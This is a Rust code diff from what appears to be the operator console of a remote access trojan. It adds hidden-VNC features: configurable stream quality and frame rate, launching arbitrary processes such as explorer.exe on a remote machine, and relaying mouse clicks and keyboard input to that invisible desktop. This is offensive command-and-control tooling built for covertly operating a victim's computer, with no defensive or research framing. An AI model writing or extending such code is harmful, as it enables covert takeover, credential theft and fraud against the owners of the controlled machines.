@@ -927,13 +927,22 @@ pub async fn request_webcam(
 pub async fn manage_hvnc(
     addr: &str,
     run: &str,
+    quality: Option<u8>,
+    fps: Option<u8>,
+    process_path: Option<String>,
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle,
 ) -> Result<String, String> {
     match run {
         "start" => {
             send_server_command(
-                ServerCommand::StartHVNC(addr.parse().unwrap()),
+                ServerCommand::StartHVNC(
+                    addr.parse().unwrap(),
+                    common::packets::HVNCConfig {
+                        quality: quality.unwrap_or(70),
+                        fps: fps.unwrap_or(5),
+                    },
+                ),
                 tauri_state,
                 app_handle,
             )
@@ -947,9 +956,19 @@ pub async fn manage_hvnc(
             )
             .await?
         }
+        "start_process" => {
+            if let Some(path) = process_path {
+                send_server_command(
+                    ServerCommand::HVNCStartProcess(addr.parse().unwrap(), path),
+                    tauri_state,
+                    app_handle,
+                )
+                .await?
+            }
+        }
         "open_explorer" => {
             send_server_command(
-                ServerCommand::OpenExplorer(addr.parse().unwrap()),
+                ServerCommand::HVNCStartProcess(addr.parse().unwrap(), "explorer.exe".to_string()),
                 tauri_state,
                 app_handle,
             )
@@ -958,6 +977,69 @@ pub async fn manage_hvnc(
         _ => {}
     }
     Ok("HVNC command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn send_hvnc_mouse_click(
+    addr: &str,
+    x: i32,
+    y: i32,
+    click_type: i32,
+    action_type: i32,
+    scroll_amount: Option<i32>,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::HVNCMouseClick(
+            addr.parse().unwrap(),
+            MouseClickData {
+                display: 0,
+                x,
+                y,
+                click_type,
+                action_type,
+                scroll_amount: scroll_amount.unwrap_or(0),
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("HVNC Mouse click sent".to_string())
+}
+
+#[tauri::command]
+pub async fn send_hvnc_keyboard_input(
+    addr: &str,
+    key_code: u32,
+    character: &str,
+    is_keydown: bool,
+    shift_pressed: bool,
+    ctrl_pressed: bool,
+    caps_lock: bool,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::HVNCKeyboardInput(
+            addr.parse().unwrap(),
+            KeyboardInputData {
+                key_code,
+                character: character.to_string(),
+                is_keydown,
+                shift_pressed,
+                ctrl_pressed,
+                caps_lock,
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("HVNC Keyboard input sent".to_string())
 }
 
 #[tauri::command]
